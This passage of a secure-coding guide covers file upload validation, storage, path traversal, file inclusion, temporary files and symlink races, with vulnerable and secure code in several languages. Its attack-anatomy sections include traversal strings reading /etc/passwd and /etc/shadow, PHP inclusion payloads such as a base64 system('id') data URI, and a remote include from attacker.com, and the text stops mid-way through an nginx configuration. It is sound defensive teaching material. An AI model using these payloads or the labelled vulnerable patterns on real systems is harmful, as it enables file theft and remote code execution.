# File Operations Security

> **Domain:** Security > Secure Coding > File Operations Security
> **Difficulty:** Intermediate to Advanced
> **Last Updated:** 2026-03-10

## Why It Matters

File operations are one of the most consistently exploited attack surfaces in web applications. Every application that accepts file uploads, reads files from disk, extracts archives, or processes images creates opportunities for attackers to achieve remote code execution, data exfiltration, denial of service, and server compromise. The 2023 MOVEit Transfer vulnerability (CVE-2023-34362) demonstrated that a single file handling flaw can compromise thousands of organizations. ImageTragick (CVE-2016-3714) showed that processing a user-uploaded image can execute arbitrary commands. Zip Slip (2018) affected thousands of projects across every major language ecosystem.

File operation vulnerabilities share a common root cause: **trusting user-supplied data to control file system behavior**. Filenames, file content, file types, archive paths, and image metadata are all attacker-controlled inputs. The defense is the same across every class: **validate every property of every file, store files outside the application's execution context, and never let user input determine file system paths.**

This guide covers file upload validation, storage security, path traversal prevention, file inclusion attacks, temporary file security, symlink attacks, directory listing prevention, file permissions, archive extraction security, and image processing security -- with vulnerable and secure code examples, CWE mappings, and layered defense strategies.

---

## Table of Contents

1. [File Upload Validation](#1-file-upload-validation)
2. [File Storage Security](#2-file-storage-security)
3. [Path Traversal Prevention (CWE-22)](#3-path-traversal-prevention-cwe-22)
4. [File Inclusion Prevention (CWE-98)](#4-file-inclusion-prevention-cwe-98)
5. [Temporary File Security (CWE-377)](#5-temporary-file-security-cwe-377)
6. [Symlink Attacks and TOCTOU (CWE-367)](#6-symlink-attacks-and-toctou-cwe-367)
7. [Directory Listing Prevention (CWE-548)](#7-directory-listing-prevention-cwe-548)
8. [File Permission Security (CWE-732)](#8-file-permission-security-cwe-732)
9. [Archive Extraction Security (CWE-409)](#9-archive-extraction-security-cwe-409)
10. [Image Processing Security](#10-image-processing-security)
11. [Best Practices](#best-practices)
12. [Anti-Patterns](#anti-patterns)
13. [Enforcement Checklist](#enforcement-checklist)

---

## 1. File Upload Validation

**What it is:** File upload validation ensures that uploaded files are the type, size, and format the application expects. Without validation, attackers upload web shells, malware, polyglot files, and oversized payloads.

**CWE References:** CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-646 (Reliance on File Name or Extension), CWE-351 (Insufficient Type Distinction).

### File Extension Validation Is Not Enough

File extensions are trivially spoofed. An attacker renames `shell.php` to `shell.php.jpg` or `shell.jpg`. Extension-only checks are always bypassable.

### Magic Bytes / File Signature Verification

Every file format begins with specific bytes (magic bytes or file signatures). Validate these bytes to confirm the actual file type, regardless of the extension or Content-Type header.

```
Common magic bytes:
  JPEG:    FF D8 FF
  PNG:     89 50 4E 47 0D 0A 1A 0A
  GIF87a:  47 49 46 38 37 61
  GIF89a:  47 49 46 38 39 61
  PDF:     25 50 44 46
  ZIP:     50 4B 03 04
  GZIP:    1F 8B
  RAR:     52 61 72 21
  WEBP:    52 49 46 46 xx xx xx xx 57 45 42 50
  BMP:     42 4D
  TIFF LE: 49 49 2A 00
  TIFF BE: 4D 4D 00 2A
```

**TypeScript:**

```typescript
// SECURE: Validate file type using magic bytes, not extension
import { readFile } from "fs/promises";

interface FileSignature {
  mime: string;
  magic: Buffer;
  offset: number;
}

const ALLOWED_SIGNATURES: FileSignature[] = [
  { mime: "image/jpeg", magic: Buffer.from([0xff, 0xd8, 0xff]), offset: 0 },
  { mime: "image/png", magic: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), offset: 0 },
  { mime: "image/gif", magic: Buffer.from("GIF87a"), offset: 0 },
  { mime: "image/gif", magic: Buffer.from("GIF89a"), offset: 0 },
  { mime: "image/webp", magic: Buffer.from("WEBP"), offset: 8 },
  { mime: "application/pdf", magic: Buffer.from("%PDF"), offset: 0 },
];

function detectFileType(buffer: Buffer): string | null {
  for (const sig of ALLOWED_SIGNATURES) {
    const slice = buffer.subarray(sig.offset, sig.offset + sig.magic.length);
    if (slice.equals(sig.magic)) {
      return sig.mime;
    }
  }
  return null; // Unknown or disallowed type
}

async function validateUpload(filePath: string, declaredMime: string): Promise<boolean> {
  const buffer = await readFile(filePath);

  // Step 1: Verify magic bytes match an allowed type
  const detectedMime = detectFileType(buffer);
  if (!detectedMime) {
    return false; // File type not in allowlist
  }

  // Step 2: Verify declared MIME matches detected MIME
  if (detectedMime !== declaredMime) {
    return false; // Content-Type spoofing detected
  }

  return true;
}
```

**Python:**

```python
# SECURE: Validate magic bytes using python-magic (libmagic wrapper)
import magic

ALLOWED_MIMES = frozenset({
    "image/jpeg",
    "image/png",
    "image/gif",
    "image/webp",
    "application/pdf",
})

def validate_file_type(file_bytes: bytes, declared_mime: str) -> bool:
    """Validate file type using libmagic, not extension or Content-Type."""
    detected_mime = magic.from_buffer(file_bytes, mime=True)

    # Step 1: Detected MIME must be in allowlist
    if detected_mime not in ALLOWED_MIMES:
        return False

    # Step 2: Declared MIME must match detected MIME
    if detected_mime != declared_mime:
        return False

    return True
```

**Go:**

```go
// SECURE: Use net/http.DetectContentType for magic bytes detection
import (
    "net/http"
    "io"
    "os"
)

var allowedMIMEs = map[string]bool{
    "image/jpeg": true,
    "image/png":  true,
    "image/gif":  true,
    "image/webp": true,
}

func ValidateFileType(filePath string) (string, error) {
    f, err := os.Open(filePath)
    if err != nil {
        return "", err
    }
    defer f.Close()

    // Read first 512 bytes for MIME detection
    buf := make([]byte, 512)
    n, err := f.Read(buf)
    if err != nil && err != io.EOF {
        return "", err
    }

    detectedMIME := http.DetectContentType(buf[:n])

    if !allowedMIMEs[detectedMIME] {
        return "", fmt.Errorf("file type %s not allowed", detectedMIME)
    }

    return detectedMIME, nil
}
```

### File Size Limits

Enforce file size limits at multiple layers: reverse proxy, web framework, and application code.

```typescript
// TypeScript (Express + multer) -- enforce size limits
import multer from "multer";

const upload = multer({
  limits: {
    fileSize: 10 * 1024 * 1024, // 10 MB hard limit
    files: 5,                    // Maximum 5 files per request
    fields: 10,                  // Maximum 10 non-file fields
  },
  storage: multer.memoryStorage(), // Or disk storage with temp directory
});

// Also enforce at the reverse proxy layer:
// Nginx:  client_max_body_size 10m;
// Apache: LimitRequestBody 10485760
// Caddy:  request_body { max_size 10MB }
```

### Filename Sanitization

User-supplied filenames are attacker-controlled input. They can contain path separators (`../`), null bytes (`\0`), unicode tricks (RTL override characters), and double extensions.

```typescript
// SECURE: Sanitize filenames -- strip everything dangerous
import { randomUUID } from "crypto";
import path from "path";

const SAFE_FILENAME_REGEX = /[^a-zA-Z0-9._-]/g;
const MAX_FILENAME_LENGTH = 255;

function sanitizeFilename(originalName: string): string {
  // Step 1: Extract only the base name (strip directory components)
  let name = path.basename(originalName);

  // Step 2: Remove null bytes (can truncate paths in C-based systems)
  name = name.replace(/\0/g, "");

  // Step 3: Remove all characters except alphanumeric, dots, hyphens, underscores
  name = name.replace(SAFE_FILENAME_REGEX, "_");

  // Step 4: Prevent double extensions (.php.jpg, .html.png)
  const parts = name.split(".");
  if (parts.length > 2) {
    name = parts[0] + "." + parts[parts.length - 1];
  }

  // Step 5: Truncate to safe length
  if (name.length > MAX_FILENAME_LENGTH) {
    const ext = path.extname(name);
    name = name.substring(0, MAX_FILENAME_LENGTH - ext.length) + ext;
  }

  return name;
}

// BEST PRACTICE: Ignore the original filename entirely. Use a UUID.
function generateSafeFilename(originalName: string): string {
  const ext = path.extname(originalName).toLowerCase();
  const ALLOWED_EXTENSIONS = new Set([".jpg", ".jpeg", ".png", ".gif", ".webp", ".pdf"]);

  if (!ALLOWED_EXTENSIONS.has(ext)) {
    throw new Error(`Extension ${ext} not allowed`);
  }

  return `${randomUUID()}${ext}`;
}
```

**Python:**

```python
# SECURE: Filename sanitization in Python
import os
import re
import uuid

SAFE_CHARS = re.compile(r"[^a-zA-Z0-9._-]")
ALLOWED_EXTENSIONS = frozenset({".jpg", ".jpeg", ".png", ".gif", ".webp", ".pdf"})

def sanitize_filename(original: str) -> str:
    """Sanitize a user-supplied filename."""
    # Strip directory components
    name = os.path.basename(original)
    # Remove null bytes
    name = name.replace("\x00", "")
    # Remove unsafe characters
    name = SAFE_CHARS.sub("_", name)
    # Truncate
    return name[:255]

def generate_safe_filename(original: str) -> str:
    """Generate a UUID-based filename, preserving only a validated extension."""
    _, ext = os.path.splitext(original.lower())
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extension {ext} not allowed")
    return f"{uuid.uuid4()}{ext}"
```

### Double Extension and Content-Type Spoofing

Attackers use double extensions to bypass naive checks. `malware.php.jpg` passes an extension check for `.jpg` but may be executed as PHP by a misconfigured web server.

```
Double extension attacks:
  shell.php.jpg      -- Apache may execute as PHP if AddHandler is misconfigured
  payload.asp;.jpg   -- IIS semicolon parsing treats this as .asp
  script.jsp%00.png  -- Null byte truncation (older systems) drops .png
  image.svg          -- SVG is XML, can contain JavaScript for XSS
  test.html          -- HTML files can execute JavaScript in the browser context

Defense:
  1. Validate magic bytes (see above) -- the definitive type check
  2. Use UUID filenames -- the original extension is irrelevant
  3. Serve uploads from a separate domain (no cookies, no same-origin)
  4. Set Content-Disposition: attachment for downloads
  5. Set X-Content-Type-Options: nosniff on all responses
```

---

## 2. File Storage Security

**What it is:** Secure file storage ensures uploaded files cannot be executed, accessed without authorization, or used to compromise the server.

### Store Uploads Outside the Webroot

Never store uploads in a directory served by the web server. If an attacker uploads a web shell and the file is inside the webroot, the web server may execute it.

```
WRONG:
  /var/www/html/uploads/image.jpg     <-- Inside webroot, directly accessible
  /public/uploads/avatar.png          <-- Served as static file

CORRECT:
  /var/data/uploads/a1b2c3d4.jpg      <-- Outside webroot, NOT directly served
  s3://my-bucket/uploads/a1b2c3d4.jpg <-- Separate storage service
```

### Use UUID Filenames

Never use the original user-supplied filename for storage. Always generate a UUID or random identifier.

```typescript
// SECURE: Complete upload handler with UUID naming and external storage
import { randomUUID } from "crypto";
import { S3Client, PutObjectCommand } from "@aws-sdk/client-s3";
import { getSignedUrl } from "@aws-sdk/s3-request-presigner";
import { GetObjectCommand } from "@aws-sdk/client-s3";

const s3 = new S3Client({ region: "us-east-1" });
const BUCKET = "my-secure-uploads";

interface UploadResult {
  fileId: string;
  storagePath: string;
  mimeType: string;
  sizeBytes: number;
}

async function storeUpload(
  fileBuffer: Buffer,
  originalName: string,
  detectedMime: string
): Promise<UploadResult> {
  const fileId = randomUUID();
  const ext = getValidatedExtension(originalName, detectedMime);
  const storagePath = `uploads/${fileId}${ext}`;

  await s3.send(
    new PutObjectCommand({
      Bucket: BUCKET,
      Key: storagePath,
      Body: fileBuffer,
      ContentType: detectedMime,
      // Prevent the file from being executed
      ContentDisposition: "attachment",
      // Server-side encryption
      ServerSideEncryption: "aws:kms",
      // Block public access
      ACL: undefined, // Rely on bucket policy, not per-object ACLs
    })
  );

  return {
    fileId,
    storagePath,
    mimeType: detectedMime,
    sizeBytes: fileBuffer.length,
  };
}

// Generate signed URL for authorized access (expires in 15 minutes)
async function getDownloadUrl(storagePath: string): Promise<string> {
  const command = new GetObjectCommand({
    Bucket: BUCKET,
    Key: storagePath,
    ResponseContentDisposition: "attachment",
  });
  return getSignedUrl(s3, command, { expiresIn: 900 }); // 15 minutes
}
```

### Virus and Malware Scanning

Scan all uploaded files for malware before processing or storing them.

**ClamAV Integration (TypeScript):**

```typescript
// SECURE: Scan uploads with ClamAV before storage
import NodeClam from "clamscan";

const clamScan = await new NodeClam().init({
  clamdscan: {
    socket: "/var/run/clamav/clamd.ctl",
    timeout: 30000,
    localFallback: true,
  },
});

async function scanForMalware(filePath: string): Promise<boolean> {
  const { isInfected, viruses } = await clamScan.isInfected(filePath);

  if (isInfected) {
    console.error(`Malware detected: ${viruses.join(", ")}`);
    // Delete the infected file immediately
    await fs.unlink(filePath);
    return false;
  }

  return true; // File is clean
}
```

**VirusTotal API Integration (Python):**

```python
# SECURE: Scan file hash against VirusTotal before processing
import hashlib
import requests

VT_API_KEY = get_secret("VIRUSTOTAL_API_KEY")  # From secrets manager
VT_URL = "https://www.virustotal.com/api/v3/files"

def scan_with_virustotal(file_bytes: bytes) -> bool:
    """Check file hash against VirusTotal. Returns True if clean."""
    file_hash = hashlib.sha256(file_bytes).hexdigest()

    response = requests.get(
        f"{VT_URL}/{file_hash}",
        headers={"x-apikey": VT_API_KEY},
        timeout=10,
    )

    if response.status_code == 404:
        # File not in VT database -- upload for scanning
        upload_response = requests.post(
            VT_URL,
            headers={"x-apikey": VT_API_KEY},
            files={"file": file_bytes},
            timeout=30,
        )
        # Queue for async result checking
        return True  # Optimistic -- check results asynchronously

    if response.status_code == 200:
        stats = response.json()["data"]["attributes"]["last_analysis_stats"]
        if stats.get("malicious", 0) > 0 or stats.get("suspicious", 0) > 0:
            return False  # Malware detected

    return True
```

---

## 3. Path Traversal Prevention (CWE-22)

**What it is:** Path traversal (directory traversal) allows an attacker to access files outside the intended directory by manipulating file paths with sequences like `../`, `..%2f`, `..%5c`, or absolute paths. This is one of the most common and dangerous file operation vulnerabilities.

**Impact:** Reading sensitive files (`/etc/passwd`, `/etc/shadow`, application configuration, source code, private keys), writing to arbitrary locations, overwriting critical system files.

### Attack Anatomy

```
Application code:
  filePath = BASE_DIR + "/" + userInput
  readFile(filePath)

Legitimate input:
  userInput = "report.pdf"
  filePath  = "/var/data/reports/report.pdf"

Malicious input:
  userInput = "../../../etc/passwd"
  filePath  = "/var/data/reports/../../../etc/passwd"
            = "/etc/passwd"

Encoded variants:
  ..%2f..%2f..%2fetc/passwd     (URL-encoded forward slash)
  ..%5c..%5c..%5cwindows\win.ini (URL-encoded backslash)
  ....//....//etc/passwd          (doubled dots and slashes)
  ..%252f..%252f..%252fetc/passwd (double URL encoding)
  ..%c0%af..%c0%af               (UTF-8 overlong encoding)
```

### Vulnerable Code Examples

**TypeScript:**

```typescript
// VULNERABLE: User input concatenated into file path
import { readFile } from "fs/promises";
import path from "path";

app.get("/download", async (req, res) => {
  const filename = req.query.file as string;
  // NEVER DO THIS -- attacker sends "../../../etc/passwd"
  const filePath = path.join("/var/data/reports", filename);
  const content = await readFile(filePath);
  res.send(content);
});
```

**Python:**

```python
# VULNERABLE: User input in file path without validation
import os

def read_report(filename: str) -> bytes:
    # NEVER DO THIS
    filepath = os.path.join("/var/data/reports", filename)
    with open(filepath, "rb") as f:
        return f.read()
```

**Go:**

```go
// VULNERABLE: User input in filepath.Join does NOT prevent traversal
func downloadHandler(w http.ResponseWriter, r *http.Request) {
    filename := r.URL.Query().Get("file")
    // NEVER DO THIS -- filepath.Join does NOT sanitize ../
    filePath := filepath.Join("/var/data/reports", filename)
    http.ServeFile(w, r, filePath)
}
```

**Java:**

```java
// VULNERABLE: User input directly in File constructor
public byte[] readReport(String filename) throws IOException {
    // NEVER DO THIS
    File file = new File("/var/data/reports/" + filename);
    return Files.readAllBytes(file.toPath());
}
```

### Secure Code Examples

**TypeScript:**

```typescript
// SECURE: Canonicalize path and verify it stays within the allowed directory
import { readFile, realpath } from "fs/promises";
import path from "path";

const BASE_DIR = "/var/data/reports";

app.get("/download", async (req, res) => {
  const filename = req.query.file as string;

  // Step 1: Strip any directory components from the input
  const baseName = path.basename(filename);

  // Step 2: Construct the candidate path
  const candidatePath = path.join(BASE_DIR, baseName);

  // Step 3: Resolve symlinks and normalize to absolute path
  let resolvedPath: string;
  try {
    resolvedPath = await realpath(candidatePath);
  } catch {
    return res.status(404).json({ error: "File not found" });
  }

  // Step 4: Verify the resolved path is within the base directory
  if (!resolvedPath.startsWith(BASE_DIR + path.sep) && resolvedPath !== BASE_DIR) {
    return res.status(403).json({ error: "Access denied" });
  }

  const content = await readFile(resolvedPath);
  res.setHeader("Content-Disposition", "attachment");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.send(content);
});
```

**Python:**

```python
# SECURE: Use os.path.realpath to canonicalize and verify containment
import os

BASE_DIR = "/var/data/reports"

def read_report(filename: str) -> bytes:
    # Step 1: Extract basename only
    safe_name = os.path.basename(filename)

    # Step 2: Construct and canonicalize the path
    candidate = os.path.join(BASE_DIR, safe_name)
    resolved = os.path.realpath(candidate)

    # Step 3: Verify containment within BASE_DIR
    if not resolved.startswith(os.path.realpath(BASE_DIR) + os.sep):
        raise PermissionError("Path traversal attempt detected")

    with open(resolved, "rb") as f:
        return f.read()
```

**Go:**

```go
// SECURE: Use filepath.Abs and strings.HasPrefix for containment check
import (
    "os"
    "path/filepath"
    "strings"
)

const baseDir = "/var/data/reports"

func readReport(filename string) ([]byte, error) {
    // Step 1: Extract basename only
    safeName := filepath.Base(filename)

    // Step 2: Construct and clean the path
    candidate := filepath.Join(baseDir, safeName)

    // Step 3: Evaluate symlinks and resolve to absolute path
    resolved, err := filepath.EvalSymlinks(candidate)
    if err != nil {
        return nil, fmt.Errorf("file not found")
    }

    absBase, _ := filepath.Abs(baseDir)

    // Step 4: Verify containment
    if !strings.HasPrefix(resolved, absBase+string(filepath.Separator)) {
        return nil, fmt.Errorf("access denied: path traversal detected")
    }

    return os.ReadFile(resolved)
}
```

**Java:**

```java
// SECURE: Use Path.normalize() and startsWith() for containment
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.Files;

public byte[] readReport(String filename) throws IOException {
    Path baseDir = Paths.get("/var/data/reports").toRealPath();

    // Step 1: Extract filename only
    String safeName = Paths.get(filename).getFileName().toString();

    // Step 2: Resolve against base directory
    Path candidate = baseDir.resolve(safeName).normalize().toRealPath();

    // Step 3: Verify containment
    if (!candidate.startsWith(baseDir)) {
        throw new SecurityException("Path traversal attempt detected");
    }

    return Files.readAllBytes(candidate);
}
```

**C#:**

```csharp
// SECURE: Use Path.GetFullPath and StartsWith for containment
public byte[] ReadReport(string filename)
{
    string baseDir = Path.GetFullPath("/var/data/reports");

    // Step 1: Extract filename only
    string safeName = Path.GetFileName(filename);

    // Step 2: Resolve full path
    string candidate = Path.GetFullPath(Path.Combine(baseDir, safeName));

    // Step 3: Verify containment
    if (!candidate.StartsWith(baseDir + Path.DirectorySeparatorChar))
    {
        throw new UnauthorizedAccessException("Path traversal attempt detected");
    }

    return File.ReadAllBytes(candidate);
}
```

### Defense Layers for Path Traversal

1. **Use `path.basename()` / `filepath.Base()`** -- extract only the filename component, stripping all directory parts.
2. **Canonicalize with `realpath()` / `toRealPath()`** -- resolve symlinks and normalize `..` sequences.
3. **Verify containment** -- after canonicalization, confirm the resolved path starts with the intended base directory.
4. **Use an allowlist of filenames** -- if the set of valid files is known, check the filename against a database or allowlist.
5. **Chroot / jail** -- on Linux, use `chroot()` or container namespaces to confine the process to a specific directory tree.

---

## 4. File Inclusion Prevention (CWE-98)

**What it is:** File inclusion vulnerabilities occur when an application dynamically includes files based on user input. Local File Inclusion (LFI) includes files from the local file system. Remote File Inclusion (RFI) includes files from external URLs. Both can lead to code execution.

**Impact:** Remote code execution (via included PHP/template files), sensitive file disclosure, server compromise.

### Attack Anatomy

```
Local File Inclusion (LFI):
  Application: include($_GET["page"] . ".php");
  Attack:      ?page=../../../../etc/passwd%00
               ?page=php://filter/convert.base64-encode/resource=config
               ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

Remote File Inclusion (RFI):
  Application: include($_GET["page"]);
  Attack:      ?page=http://attacker.com/shell.php

Template Path Injection:
  Application: render_template(f"pages/{user_input}.html")
  Attack:      user_input = "../../secrets/api_keys"
```

### Vulnerable Code

```python
# VULNERABLE: User input determines template file path
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/page")
def page():
    template = request.args.get("template", "home")
    # NEVER DO THIS -- attacker controls the template path
    return render_template(f"pages/{template}.html")
```

### Secure Code

```python
# SECURE: Allowlist of permitted template names
from flask import Flask, request, render_template, abort

app = Flask(__name__)

ALLOWED_PAGES = frozenset({
    "home",
    "about",
    "contact",
    "faq",
    "terms",
    "privacy",
})

@app.route("/page")
def page():
    template = request.args.get("template", "home")

    # Step 1: Validate against allowlist
    if template not in ALLOWED_PAGES:
        abort(404)

    # Step 2: Construct path from validated value
    return render_template(f"pages/{template}.html")
```

```typescript
// SECURE: Map user input to predefined file paths
const PAGE_MAP: Record<string, string> = {
  home: "pages/home.html",
  about: "pages/about.html",
  contact: "pages/contact.html",
  faq: "pages/faq.html",
};

app.get("/page", (req, res) => {
  const pageKey = req.query.page as string;

  // Step 1: Lookup in allowlist map
  const templatePath = PAGE_MAP[pageKey];
  if (!templatePath) {
    return res.status(404).json({ error: "Page not found" });
  }

  // Step 2: Serve the predefined path (user input never touches the filesystem)
  res.render(templatePath);
});
```

### Defense Layers for File Inclusion

1. **Allowlist file paths** -- map user input to a fixed set of permitted paths. Never use user input directly as a path component.
2. **Disable remote includes** -- in PHP, set `allow_url_include = Off` and `allow_url_fopen = Off`.
3. **Use a template engine with auto-escaping** -- Jinja2, Handlebars, and Pug prevent arbitrary code execution in templates.
4. **Apply path traversal defenses** -- if dynamic paths are unavoidable, apply all canonicalization and containment checks from Section 3.

---

## 5. Temporary File Security (CWE-377)

**What it is:** Temporary files created with predictable names, insecure permissions, or without proper cleanup create race conditions and information disclosure vulnerabilities. An attacker who can predict the temp file name can read, modify, or replace the file between creation and use.

**Impact:** Information disclosure, privilege escalation, data corruption, arbitrary code execution via temp file replacement.

### mktemp vs mkstemp

`mktemp()` creates a unique filename but does NOT create the file. Between the name generation and file creation, an attacker can create a file (or symlink) with that name. `mkstemp()` atomically creates the file with restrictive permissions, eliminating the race condition.

```
WRONG (race condition):
  1. mktemp() returns "/tmp/myapp_abc123"     -- Name generated
  2. Attacker creates /tmp/myapp_abc123 -> /etc/passwd  -- Symlink created
  3. open("/tmp/myapp_abc123", "w")            -- Application writes to /etc/passwd

CORRECT (atomic creation):
  1. mkstemp() creates "/tmp/myapp_abc123" with mode 0600 atomically
  2. Returns open file descriptor -- no window for attack
```

### Secure Temporary File Patterns

**TypeScript:**

```typescript
// SECURE: Create temp files with restrictive permissions
import { mkdtemp, writeFile, rm } from "fs/promises";
import { tmpdir } from "os";
import path from "path";
import { randomUUID } from "crypto";

async function processWithTempFile(data: Buffer): Promise<string> {
  // Create a unique temporary directory (atomic, restrictive permissions)
  const tempDir = await mkdtemp(path.join(tmpdir(), "myapp-"));

  const tempFile = path.join(tempDir, `${randomUUID()}.tmp`);

  try {
    // Write with restrictive permissions (owner read/write only)
    await writeFile(tempFile, data, { mode: 0o600 });

    // Process the temp file
    const result = await processFile(tempFile);
    return result;
  } finally {
    // ALWAYS clean up -- use finally to guarantee cleanup
    await rm(tempDir, { recursive: true, force: true });
  }
}
```

**Python:**

```python
# SECURE: Use tempfile module with context managers for guaranteed cleanup
import tempfile
import os

def process_with_temp_file(data: bytes) -> str:
    """Process data using a secure temporary file."""
    # NamedTemporaryFile uses mkstemp internally -- atomic creation, mode 0600
    # delete=True (default) ensures cleanup when context exits
    with tempfile.NamedTemporaryFile(
        prefix="myapp_",
        suffix=".tmp",
        delete=True,     # Auto-delete on close
        dir="/tmp",      # Explicit directory
    ) as tmp:
        tmp.write(data)
        tmp.flush()
        # Process the temp file
        result = process_file(tmp.name)
        return result
    # File is automatically deleted here, even if an exception occurs

def process_with_temp_dir(data: bytes) -> str:
    """Use a temporary directory for multiple temp files."""
    with tempfile.TemporaryDirectory(prefix="myapp_") as tmpdir:
        filepath = os.path.join(tmpdir, "data.tmp")
        with open(filepath, "wb") as f:
            os.fchmod(f.fileno(), 0o600)  # Restrictive permissions
            f.write(data)
        result = process_file(filepath)
        return result
    # Entire directory is automatically deleted here
```

**Go:**

```go
// SECURE: Use os.CreateTemp for atomic temp file creation
import (
    "os"
    "path/filepath"
)

func processWithTempFile(data []byte) (string, error) {
    // os.CreateTemp atomically creates a file with mode 0600
    tmpFile, err := os.CreateTemp("", "myapp-*.tmp")
    if err != nil {
        return "", err
    }
    // Guarantee cleanup
    defer os.Remove(tmpFile.Name())
    defer tmpFile.Close()

    // Write data
    if _, err := tmpFile.Write(data); err != nil {
        return "", err
    }

    // Ensure data is flushed to disk
    if err := tmpFile.Sync(); err != nil {
        return "", err
    }

    return processFile(tmpFile.Name())
}

func processWithTempDir(data []byte) (string, error) {
    // os.MkdirTemp creates a directory with mode 0700
    tmpDir, err := os.MkdirTemp("", "myapp-")
    if err != nil {
        return "", err
    }
    defer os.RemoveAll(tmpDir)

    filePath := filepath.Join(tmpDir, "data.tmp")
    if err := os.WriteFile(filePath, data, 0600); err != nil {
        return "", err
    }

    return processFile(filePath)
}
```

**Java:**

```java
// SECURE: Use Files.createTempFile with restrictive permissions
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermissions;

public String processWithTempFile(byte[] data) throws IOException {
    // createTempFile creates with restrictive permissions
    Path tempFile = Files.createTempFile(
        "myapp_", ".tmp",
        PosixFilePermissions.asFileAttribute(
            PosixFilePermissions.fromString("rw-------")
        )
    );

    try {
        Files.write(tempFile, data);
        return processFile(tempFile);
    } finally {
        // Guarantee cleanup
        Files.deleteIfExists(tempFile);
    }
}
```

**C#:**

```csharp
// SECURE: Use Path.GetTempFileName for atomic creation, then restrict permissions
public string ProcessWithTempFile(byte[] data)
{
    string tempFile = Path.GetTempFileName(); // Atomically creates with restrictive perms

    try
    {
        File.WriteAllBytes(tempFile, data);
        return ProcessFile(tempFile);
    }
    finally
    {
        // Guarantee cleanup
        if (File.Exists(tempFile))
        {
            File.Delete(tempFile);
        }
    }
}
```

---

## 6. Symlink Attacks and TOCTOU (CWE-367)

**What it is:** Symlink attacks exploit the gap between checking a file's properties (Time of Check) and using the file (Time of Use). An attacker replaces a legitimate file with a symbolic link to a sensitive file between the check and the use. This is a race condition known as TOCTOU (Time-of-Check Time-of-Use).

**Impact:** Reading or overwriting arbitrary files, privilege escalation, data corruption.

### Attack Anatomy

```
TOCTOU Race Condition:

  1. Application checks: Is /tmp/output a regular file? YES
  2. Attacker deletes /tmp/output and creates symlink: /tmp/output -> /etc/shadow
  3. Application writes to /tmp/output -- actually writes to /etc/shadow

The window between step 1 and step 3 is the race condition.
```

### Vulnerable Code

```python
# VULNERABLE: TOCTOU race condition with symlink
import os

def write_output(data: bytes, filepath: str) -> None:
    # Check: is it a regular file (not a symlink)?
    if os.path.islink(filepath):
        raise ValueError("Symlink detected")

    # RACE CONDITION: Between islink() and open(), attacker replaces the file
    with open(filepath, "wb") as f:
        f.write(data)
```

### Secure Code

**Python:**

```python
# SECURE: Use O_NOFOLLOW and file descriptor operations to avoid TOCTOU
import os
import stat

def safe_write(data: bytes, filepath: str) -> None:
    """Write to file without following symlinks."""
    # O_NOFOLLOW: open() fails if the path is a symlink
    # O_CREAT | O_WRONLY: create if not exists, write only
    # O_EXCL: fail if file already exists (for new files)
    fd = os.open(
        filepath,
        os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW,
        0o600,
    )
    try:
        # Verify the file descriptor points to a regular file
        file_stat = os.fstat(fd)
        if not stat.S_ISREG(file_stat.st_mode):
            raise ValueError("Not a regular file")

        os.write(fd, data)
    finally:
        os.close(fd)


def safe_read(filepath: str) -> bytes:
    """Read a file without following symlinks."""
    fd = os.open(filepath, os.O_RDONLY | os.O_NOFOLLOW)
    try:
        file_stat = os.fstat(fd)
        if not stat.S_ISREG(file_stat.st_mode):
            raise ValueError("Not a regular file")

        return os.read(fd, file_stat.st_size)
    finally:
        os.close(fd)
```

**Go:**

```go
// SECURE: Use O_NOFOLLOW and Fstat to prevent symlink attacks
import (
    "os"
    "syscall"
)

func safeWriteFile(filepath string, data []byte) error {
    // O_NOFOLLOW causes open to fail if path is a symlink
    fd, err := syscall.Open(filepath,
        syscall.O_WRONLY|syscall.O_CREAT|syscall.O_TRUNC|syscall.O_NOFOLLOW,
        0600,
    )
    if err != nil {
        return err
    }
    defer syscall.Close(fd)

    // Verify via file descriptor that it is a regular file
    var stat syscall.Stat_t
    if err := syscall.Fstat(fd, &stat); err != nil {
        return err
    }
    if stat.Mode&syscall.S_IFMT != syscall.S_IFREG {
        return fmt.Errorf("not a regular file")
    }

    _, err = syscall.Write(fd, data)
    return err
}
```

**Java:**

```java
// SECURE: Use NOFOLLOW_LINKS to prevent symlink traversal
import java.nio.file.*;
import java.nio.file.attribute.PosixFilePermissions;

public void safeWriteFile(Path filePath, byte[] data) throws IOException {
    // NOFOLLOW_LINKS ensures symlinks are not followed
    // Check that the path is not a symlink
    if (Files.isSymbolicLink(filePath)) {
        throw new SecurityException("Symlink detected");
    }

    // Use OpenOption NOFOLLOW_LINKS (via LinkOption)
    // Write with restrictive permissions
    Files.write(filePath, data,
        StandardOpenOption.CREATE,
        StandardOpenOption.WRITE,
        StandardOpenOption.TRUNCATE_EXISTING,
        LinkOption.NOFOLLOW_LINKS
    );
}
```

### Defense Layers for Symlink Attacks

1. **Use `O_NOFOLLOW`** -- the `open()` system call fails if the target is a symlink.
2. **Operate on file descriptors, not paths** -- after opening a file, use `fstat()`, `fchmod()`, `fchown()` on the file descriptor, not the path.
3. **Create files in directories owned by the application** -- an attacker cannot create symlinks in directories they cannot write to.
4. **Use temporary directories with restrictive permissions** -- `mkdtemp()` creates a directory with mode 0700, preventing other users from creating symlinks inside it.

---

## 7. Directory Listing Prevention (CWE-548)

**What it is:** Directory listing (directory indexing) exposes the contents of a directory when no index file is present. Attackers use directory listings to discover backup files, configuration files, source code, and hidden resources.

**Impact:** Information disclosure, discovery of sensitive files, reconnaissance for further attacks.

### Web Server Configuration

**Nginx:**

```nginx
# SECURE: Disable directory listing globally
server {
    # Disable autoindex globally
    autoindex off;

    # Serve only specific file types from upload directories
    location /static/ {
        autoindex off;
        # Only serve known-safe file types
        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff2|woff|ttf)$ {
            expires 30d;
            add_header X-Content-Type-Options "nosniff" always;
        }
        # Block everything else
        location / {
            return 403;
        }
    }

    # Block access to hidden files and directories
    location ~ /\. {
        deny all;
        return 404;
    }

    # Block access to backup files
